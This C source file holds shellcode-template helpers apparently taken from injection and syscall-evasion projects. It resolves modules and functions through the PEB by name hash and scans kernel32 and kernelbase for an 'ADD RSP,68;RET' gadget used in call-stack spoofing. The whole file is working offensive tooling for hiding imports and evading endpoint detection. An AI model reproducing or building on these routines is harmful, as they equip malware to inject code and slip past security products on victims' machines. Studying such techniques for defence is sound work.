#include <Win32.h>
#include <Utils.h>
#include <Macros.h>

#include <winternl.h>

//ref:https://github.com/Dec0ne/DllNotificationInjection/tree/master/ShellcodeTemplate/Source
// NOTE: The Module hash needs to be a hash from a wide string instead of an ansi string.
SEC( text, B )LPVOID LdrModulePeb(UINT_PTR hModuleHash)
{
    unsigned char cstr_module_name[256] = { 0 };
    PLDR_DATA_TABLE_ENTRY Module = (PLDR_DATA_TABLE_ENTRY)((PPEB)PPEB_PTR)->Ldr->InMemoryOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY FirstModule = Module;

    do
    {
        ConvertPWSTRToUnsignedChar((unsigned char*)cstr_module_name, sizeof(cstr_module_name), Module->FullDllName.Buffer, Module->FullDllName.Length - 1);
        DWORD ModuleHash = runtime_hash(cstr_module_name);// , Module->FullDllName.Length);ConvertPWSTRToUnsignedChar
        if (ModuleHash == hModuleHash)
            return Module->Reserved2[0];

        Module = (PLDR_DATA_TABLE_ENTRY)Module->Reserved1[0];
    } while (Module && Module != FirstModule);

    return INVALID_HANDLE_VALUE;
}
//ref:https://github.com/Dec0ne/DllNotificationInjection/tree/master/ShellcodeTemplate/Source

SEC( text, B ) LPVOID LdrFunction(UINT_PTR Module, UINT_PTR FunctionHash)
{
    PIMAGE_NT_HEADERS       NtHeader = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory = NULL;
    PDWORD                  AddrOfFunctions = NULL;
    PDWORD                  AddrOfNames = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FunctionAddr = NULL;
    PCHAR                   FunctionName = NULL;
    ANSI_STRING             AnsiString = { 0 };

    NtHeader = (PIMAGE_NT_HEADERS)(Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
    ExpDirectory = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    AddrOfNames = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < ExpDirectory->NumberOfNames; i++)
    {
        FunctionName = (PCHAR)Module + AddrOfNames[i];
        if (runtime_hash((unsigned char*)FunctionName) == FunctionHash)
        {
            return (PVOID)(Module + AddrOfFunctions[AddrOfOrdinals[i]]);
        }
    }
}


//ref: https://github.com/Dec0ne/HWSyscalls
SEC( text, B ) BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}
//ref: https://github.com/Dec0ne/HWSyscalls
SEC( text, B ) DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}
//ref: https://github.com/Dec0ne/HWSyscalls
SEC( text, B ) DWORD_PTR FindInModule(HMODULE* hModule, PBYTE bMask, PCHAR szMask)
{
	
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)*hModule;

    if (!imageBase)
	{
        return 0;
	}

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
	{
		return 0;
	}

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}
//ref: https://github.com/Dec0ne/HWSyscalls
SEC( text, B ) BOOL FindRetGadget(LPVOID* retGadgetAddress ) {
	//LPVOID retGadgetAddress;
	HMODULE module=(HMODULE)LdrModulePeb(kernel32_hash);
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    *retGadgetAddress = FindInModule(&module, (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (*retGadgetAddress != 0) {
      //  DEBUG_PRINT("[+] Found RET_GADGET in kernel32.dll: %#llx\n", *retGadgetAddress);
        return TRUE;
    }
    else {
		module=(HMODULE)LdrModulePeb(kernelbase_hash);
        *retGadgetAddress = FindInModule(&module, (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
        //DEBUG_PRINT("[+] Found RET_GADGET in kernelbase.dll: %#llx\n", *retGadgetAddress);
        if (*retGadgetAddress != 0) {
            return TRUE;
        }
    }
    return FALSE;
}